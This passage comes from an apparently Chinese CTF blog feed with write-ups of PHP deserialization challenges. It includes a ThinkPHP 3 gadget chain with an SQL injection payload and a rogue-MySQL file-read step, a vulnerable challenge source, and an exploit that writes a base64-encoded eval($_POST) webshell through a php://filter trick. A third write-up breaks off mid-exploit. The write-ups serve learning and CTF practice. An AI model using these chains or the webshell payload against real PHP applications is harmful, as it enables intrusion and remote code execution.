class="title">Think</span>\<span class="title">Db</span>\<span class="title">Driver</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">PDO</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Mysql</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$options</span> = <span class="keyword">array</span>(</span><br><span class="line">            PDO::MYSQL_ATTR_LOCAL_INFILE =&gt; <span class="literal">true</span>    <span class="comment">// 开启才能读取文件</span></span><br><span class="line">        );</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$config</span> = <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">&quot;debug&quot;</span>    =&gt; <span class="number">1</span>,</span><br><span class="line">            <span class="string">&quot;database&quot;</span> =&gt; <span class="string">&quot;thinkphp3&quot;</span>,</span><br><span class="line">            <span class="string">&quot;hostname&quot;</span> =&gt; <span class="string">&quot;192.168.111.129&quot;</span>,</span><br><span class="line">            <span class="string">&quot;hostport&quot;</span> =&gt; <span class="string">&quot;3306&quot;</span>,</span><br><span class="line">            <span class="string">&quot;charset&quot;</span>  =&gt; <span class="string">&quot;utf8&quot;</span>,</span><br><span class="line">            <span class="string">&quot;username&quot;</span> =&gt; <span class="string">&quot;root&quot;</span>,</span><br><span class="line">            <span class="string">&quot;password&quot;</span> =&gt; <span class="string">&quot;&quot;</span></span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Think</span>\<span class="title">Image</span>\<span class="title">Driver</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">Think</span>\<span class="title">Session</span>\<span class="title">Driver</span>\<span class="title">Memcache</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Imagick</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$img</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;img = <span class="keyword">new</span> Memcache();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Think</span>\<span class="title">Session</span>\<span class="title">Driver</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">Think</span>\<span class="title">Model</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Memcache</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$handle</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;handle = <span class="keyword">new</span> Model();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Think</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">Think</span>\<span class="title">Db</span>\<span class="title">Driver</span>\<span class="title">Mysql</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Model</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$options</span>   = <span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$pk</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$data</span> = <span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$db</span> = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;db = <span class="keyword">new</span> Mysql();</span><br><span class="line">            <span class="keyword">$this</span>-&gt;options[<span class="string">&#x27;where&#x27;</span>] = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;pk = <span class="string">&#x27;id&#x27;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;data[<span class="keyword">$this</span>-&gt;pk] = <span class="keyword">array</span>(</span><br><span class="line">                <span class="string">&quot;table&quot;</span> =&gt; <span class="string">&quot;mysql.user where 1=updatexml(1,user(),1)#&quot;</span>,</span><br><span class="line">                <span class="string">&quot;where&quot;</span> =&gt; <span class="string">&quot;1=1&quot;</span></span><br><span class="line">            );</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">    <span class="title">echo</span> <span class="title">base64_encode</span>(<span class="title">serialize</span>(<span class="title">new</span> <span class="title">Think</span>\<span class="title">Image</span>\<span class="title">Driver</span>\<span class="title">Imagick</span>()));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>利用<code>LOAD DATA INFILE</code>读取文件，由于mysql客户端绝对信任服务端。导致攻击机可以构造一个恶意服务端，在连接的时候发送读取文件的请求，然后返回的结果会被记录到mysql.log</p><p>搭建mysql服务端-&gt;客户端连接-&gt;发送读取文件请求-&gt;在mysql.log中读取文件的内容</p><p><a href="https://github.com/allyshka/Rogue-MySql-Server/">https://github.com/allyshka/Rogue-MySql-Server/</a></p><p>修改为要读取的文件</p><p><img src="https://i.loli.net/2021/04/04/DhMvrdsUTx4OXtK.png" alt="image-20210404184322223.png"></p><p>运行</p><p><img src="https://i.loli.net/2021/04/04/Ou1W7lzx9F5hVyQ.png" alt="image-20210404184420116.png"></p><p>触发反序列化，连接恶意服务端</p><p><img src="https://i.loli.net/2021/04/04/DWjhfvqIZEnMcug.png" alt="image-20210404211227400.png"></p><p>在mysql.log中查看读取到的文件</p><p><img src="https://i.loli.net/2021/04/04/6ZTkbs1AumcNQJI.png" alt="image-20210404184644477.png"></p><p><img src="https://i.loli.net/2021/04/04/ZLzw2tCIXQhpjPm.png" alt="image-20210404184609586.png"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>2020 新春红包题1</title>
    <link href="/2021/03/30/2020-%E6%96%B0%E6%98%A5%E7%BA%A2%E5%8C%85%E9%A2%981/"/>
    <url>/2021/03/30/2020-%E6%96%B0%E6%98%A5%E7%BA%A2%E5%8C%85%E9%A2%981/</url>
    
    <content type="html"><![CDATA[<h1 id="2020-新春红包题-1"><a href="#2020-新春红包题-1" class="headerlink" title="[2020 新春红包题]1"></a>[2020 新春红包题]1</h1><p>可以看到B类中有一个危险函数file_put_contents，只要能控制文件名和文件内容就可以写入webshell。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$store</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$key</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$expire</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$store</span>, <span class="variable">$key</span> = <span class="string">&#x27;flysystem&#x27;</span>, <span class="variable">$expire</span> = <span class="literal">null</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;key = <span class="variable">$key</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;store = <span class="variable">$store</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;expire = <span class="variable">$expire</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">cleanContents</span>(<span class="params"><span class="keyword">array</span> <span class="variable">$contents</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$cachedProperties</span> = array_flip([</span><br><span class="line">            <span class="string">&#x27;path&#x27;</span>, <span class="string">&#x27;dirname&#x27;</span>, <span class="string">&#x27;basename&#x27;</span>, <span class="string">&#x27;extension&#x27;</span>, <span class="string">&#x27;filename&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;size&#x27;</span>, <span class="string">&#x27;mimetype&#x27;</span>, <span class="string">&#x27;visibility&#x27;</span>, <span class="string">&#x27;timestamp&#x27;</span>, <span class="string">&#x27;type&#x27;</span>,</span><br><span class="line">        ]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$contents</span> <span class="keyword">as</span> <span class="variable">$path</span> =&gt; <span class="variable">$object</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (is_array(<span class="variable">$object</span>)) &#123;</span><br><span class="line">                <span class="variable">$contents</span>[<span class="variable">$path</span>] = array_intersect_key(<span class="variable">$object</span>, <span class="variable">$cachedProperties</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$contents</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getForStorage</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$cleaned</span> = <span class="keyword">$this</span>-&gt;cleanContents(<span class="keyword">$this</span>-&gt;cache);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> json_encode([<span class="variable">$cleaned</span>, <span class="keyword">$this</span>-&gt;complete]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">save</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$contents</span> = <span class="keyword">$this</span>-&gt;getForStorage();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;store-&gt;set(<span class="keyword">$this</span>-&gt;key, <span class="variable">$contents</span>, <span class="keyword">$this</span>-&gt;expire);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">$this</span>-&gt;autosave) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;save();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">getExpireTime</span>(<span class="params"><span class="variable">$expire</span></span>): <span class="title">int</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> (<span class="keyword">int</span>) <span class="variable">$expire</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getCacheKey</span>(<span class="params"><span class="keyword">string</span> <span class="variable">$name</span></span>): <span class="title">string</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 使缓存文件名随机</span></span><br><span class="line">        <span class="variable">$cache_filename</span> = <span class="keyword">$this</span>-&gt;options[<span class="string">&#x27;prefix&#x27;</span>] . uniqid() . <span class="variable">$name</span>;</span><br><span class="line">        <span class="keyword">if</span>(substr(<span class="variable">$cache_filename</span>, -strlen(<span class="string">&#x27;.php&#x27;</span>)) === <span class="string">&#x27;.php&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;?&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$cache_filename</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">serialize</span>(<span class="params"><span class="variable">$data</span></span>): <span class="title">string</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (is_numeric(<span class="variable">$data</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> (<span class="keyword">string</span>) <span class="variable">$data</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$serialize</span> = <span class="keyword">$this</span>-&gt;options[<span class="string">&#x27;serialize&#x27;</span>];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$serialize</span>(<span class="variable">$data</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">set</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$value</span>, <span class="variable">$expire</span> = <span class="literal">null</span></span>): <span class="title">bool</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;writeTimes++;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (is_null(<span class="variable">$expire</span>)) &#123;</span><br><span class="line">            <span class="variable">$expire</span> = <span class="keyword">$this</span>-&gt;options[<span class="string">&#x27;expire&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$expire</span> = <span class="keyword">$this</span>-&gt;getExpireTime(<span class="variable">$expire</span>);</span><br><span class="line">        <span class="variable">$filename</span> = <span class="keyword">$this</span>-&gt;getCacheKey(<span class="variable">$name</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$dir</span> = dirname(<span class="variable">$filename</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!is_dir(<span class="variable">$dir</span>)) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                mkdir(<span class="variable">$dir</span>, <span class="number">0755</span>, <span class="literal">true</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (\<span class="built_in">Exception</span> <span class="variable">$e</span>) &#123;</span><br><span class="line">                <span class="comment">// 创建失败</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$data</span> = <span class="keyword">$this</span>-&gt;serialize(<span class="variable">$value</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;options[<span class="string">&#x27;data_compress&#x27;</span>] &amp;&amp; function_exists(<span class="string">&#x27;gzcompress&#x27;</span>)) &#123;</span><br><span class="line">            <span class="comment">//数据压缩</span></span><br><span class="line">            <span class="variable">$data</span> = gzcompress(<span class="variable">$data</span>, <span class="number">3</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$data</span> = <span class="string">&quot;&lt;?php\n//&quot;</span> . sprintf(<span class="string">&#x27;%012d&#x27;</span>, <span class="variable">$expire</span>) . <span class="string">&quot;\n exit();?&gt;\n&quot;</span> . <span class="variable">$data</span>;</span><br><span class="line">        <span class="variable">$result</span> = file_put_contents(<span class="variable">$filename</span>, <span class="variable">$data</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$result</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$filename</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;src&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$dir</span> = <span class="string">&quot;uploads/&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!is_dir(<span class="variable">$dir</span>))</span><br><span class="line">&#123;</span><br><span class="line">    mkdir(<span class="variable">$dir</span>);</span><br><span class="line">&#125;</span><br><span class="line">unserialize(<span class="variable">$_GET</span>[<span class="string">&quot;data&quot;</span>]);</span><br></pre></td></tr></table></figure><h2 id="文件名"><a href="#文件名" class="headerlink" title="文件名"></a>文件名</h2><p>A类的key属性作为参数传入set函数</p><p><a href="https://imgtu.com/i/cF0u6J"><img src="https://z3.ax1x.com/2021/03/30/cF0u6J.png" alt="cF0u6J.png"></a></p><p>key属性传入set方法后作为$name传入getCachekey方法，返回$filename后作为file_put_contents函数的文件名参数</p><p><a href="https://imgtu.com/i/cF0QmR"><img src="https://z3.ax1x.com/2021/03/30/cF0QmR.png" alt="cF0QmR.png"></a></p><p>B类的getCacheKey方法。文件名由<code>$this-&gt;options[&#39;prefix&#39;] . uniqid() . $name</code>拼接而成，uniqid()为随机生成的一串数字，同时取最后四位看是否等于.php。只要利用linux目录解析特性传入<code>/../shell.php/.</code>这种形式即可绕过后缀名限制</p><p><a href="https://imgtu.com/i/cF0KX9"><img src="https://z3.ax1x.com/2021/03/30/cF0KX9.png" alt="cF0KX9.png"></a></p><h2 id="文件内容"><a href="#文件内容" class="headerlink" title="文件内容"></a>文件内容</h2><p>1.A类的__destruct()方法触发save方法</p><p><a href="https://imgtu.com/i/cF08k6"><img src="https://z3.ax1x.com/2021/03/30/cF08k6.png" alt="cF08k6.png"></a></p><p>2.A类的save方法调用set方法，令store属性等于B类触发set，写入的文件内容$content等于getForStorage方法返回值,we</p><p><a href="https://imgtu.com/i/cF0l01"><img src="https://z3.ax1x.com/2021/03/30/cF0l01.png" alt="cF0l01.png"></a></p><p>3.A类的getForStorage方法，</p><p><a href="https://imgtu.com/i/cF0mpF"><img src="https://z3.ax1x.com/2021/03/30/cF0mpF.png" alt="cF0mpF.png"></a></p><p>4.A类的cleanContents方法，接收一个数组为参数，array_intersect_key取两个数组的子集，把它们的键值交换后返回，这里就要求cache必须为一个数组</p><p><a href="https://imgtu.com/i/cF0nl4"><img src="https://z3.ax1x.com/2021/03/30/cF0nl4.png" alt="cF0nl4.png"></a></p><p>5.B类的serialize方法，返回$serialize($dara)，可以使$this-&gt;options[‘serialize’]等于serialize</p><p><a href="https://imgtu.com/i/cF01Tx"><img src="https://z3.ax1x.com/2021/03/30/cF01Tx.png" alt="cF01Tx.png"></a></p><p>6.set方法中文件内容$data被拼接上了&lt;?php exit();。由于file_put_contents的第一个参数可以为php伪协议，这样我们就可以设置file_put_contents的第一个参数为php://fliter/write=convert.base64-decode，第二个参数为base64编码后的一句话，这样前面的拼接上的&lt;?php exit();就会被转换成乱码。</p><p><a href="https://imgtu.com/i/cF0GtK"><img src="https://z3.ax1x.com/2021/03/30/cF0GtK.png" alt="cF0GtK.png"></a></p><p>cache属性的处理过程，最终作为文件内容参数传入file_put_contents</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">serialize(json_encode(cleanContents(<span class="keyword">$this</span>-&gt;cache)))</span><br></pre></td></tr></table></figure><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>构造exp</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$store</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$key</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$expire</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cache</span> =[];</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$complete</span> = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;store = <span class="keyword">new</span> B();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;key = <span class="string">&#x27;/../1.php/.&#x27;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;cache = [<span class="string">&#x27;dirname&#x27;</span>=&gt;<span class="string">&#x27;aPD9waHAgZXZhbCgkX1BPU1RbMV0pOz8+&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$options</span> = [</span><br><span class="line">        <span class="string">&#x27;serialize&#x27;</span> =&gt; <span class="string">&#x27;serialize&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;prefix&#x27;</span> =&gt; <span class="string">&#x27;php://filter/write=convert.base64-decode/resource=./uploads/&#x27;</span>,</span><br><span class="line">    ];</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> A();</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize(<span class="variable">$a</span>));</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>成功写入文件</p><p><a href="https://imgtu.com/i/cF0tpD"><img src="https://z3.ax1x.com/2021/03/30/cF0tpD.png" alt="cF0tpD.png"></a></p><p>拿到flag</p><p><a href="https://imgtu.com/i/cF0JfO"><img src="https://z3.ax1x.com/2021/03/30/cF0JfO.png" alt="cF0JfO.png"></a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>GYCTF2020 Easyphp</title>
    <link href="/2021/03/27/GYCTF2020-Easyphp/"/>
    <url>/2021/03/27/GYCTF2020-Easyphp/</url>
    
    <content type="html"><![CDATA[<h1 id="GYCTF2020-Easyphp"><a href="#GYCTF2020-Easyphp" class="headerlink" title="[GYCTF2020]Easyphp"></a>[GYCTF2020]Easyphp</h1><p>反序列化字符串逃逸</p><p>下载<a href="http://www.zip开始审计/">www.zip开始审计</a></p><p><a href="https://imgtu.com/i/cSm2vt"><img src="https://z3.ax1x.com/2021/03/27/cSm2vt.png" alt="cSm2vt.png"></a></p><p>目录结构如下，lib.php中存在反序列化利用链</p><p><a href="https://imgtu.com/i/cSmWKP"><img src="https://z3.ax1x.com/2021/03/27/cSmWKP.png" alt="cSmWKP.png"></a></p><h2 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h2><p>1.update.php实例化User类并调用update()</p><p><a href="https://imgtu.com/i/cSmDED"><img src="https://z3.ax1x.com/2021/03/27/cSmDED.png" alt="cSmDED.png"></a></p><p>2.User类的update方法unserialize($this-&gt;getNewinfo())，序列化内容来自于getNewinfo方法</p><p><a href="https://imgtu.com/i/cSm0HO"><img src="https://z3.ax1x.com/2021/03/27/cSm0HO.png" alt="cSm0HO.png"></a></p><p>3.User类的getNewInfo()方法，将Info类序列化，并且safe函数改变了序列化字符串，存在字符逃逸。只要传入union，就会被自动替换成hacker，payload有多长，就输入多少个union，这样多出来一个字符，利用这个特性满足前面的字符串长度后，后面的语句从字符串中逃逸出来，成功反序列化。</p><p><a href="https://imgtu.com/i/cSmdu6"><img src="https://z3.ax1x.com/2021/03/27/cSmdu6.png" alt="cSmdu6.png"></a></p><p><a href="https://imgtu.com/i/cSmc8A"><img src="https://z3.ax1x.com/2021/03/27/cSmc8A.png" alt="cSmc8A.png"></a></p><p>4.Info类中的属性均可控，age属性和nickname属性均由post传值得到。利用safe函数增加字符的功能进行字符串逃逸，反序列化恶意类UpdateHelper，这样即可执行任意sql语句。</p><p><a href="https://imgtu.com/i/cSmrUe"><img src="https://z3.ax1x.com/2021/03/27/cSmrUe.png" alt="cSmrUe.png"></a></p><h2 id="恶意类"><a href="#恶意类" class="headerlink" title="恶意类"></a>恶意类</h2><p>1.UpdateHelper类<code>__destruct()</code>方法，令UpdateHelper类的sql属性等于User类触发<code>__toString()</code>方法</p><p><a href="https://imgtu.com/i/cSmwDK"><img src="https://z3.ax1x.com/2021/03/27/cSmwDK.png" alt="cSmwDK.png"></a></p><p>2.User类的<code>__toString()</code>方法，只要让nickname属性等于Info类即可触发<code>__call()</code>方法</p><p><a href="https://imgtu.com/i/cSmUjx"><img src="https://z3.ax1x.com/2021/03/27/cSmUjx.png" alt="cSmUjx.png"></a></p><p>3.Info类的__call()方法,令属性CtrlCase等于dbCtrl类,调用其中的login方法，执行语句$argument[0]实际来源于User类的age属性</p><p><a href="https://imgtu.com/i/cSmrUe"><img src="https://z3.ax1x.com/2021/03/27/cSmrUe.png" alt="cSmrUe.png"></a></p><p>4.dbCtrl类的login方法，接收$sql参数并执行它，传入参数可控，可以执行任意sql语句。需要令name属性等于admin，绑定到sql语句中的?中。然后令token属性等于admin，即可返回$idResult，看到sql语句执行的结果。</p><p><a href="https://imgtu.com/i/cSm6Cd"><img src="https://z3.ax1x.com/2021/03/27/cSm6Cd.png" alt="cSm6Cd.png"></a></p><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>构造exp</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span 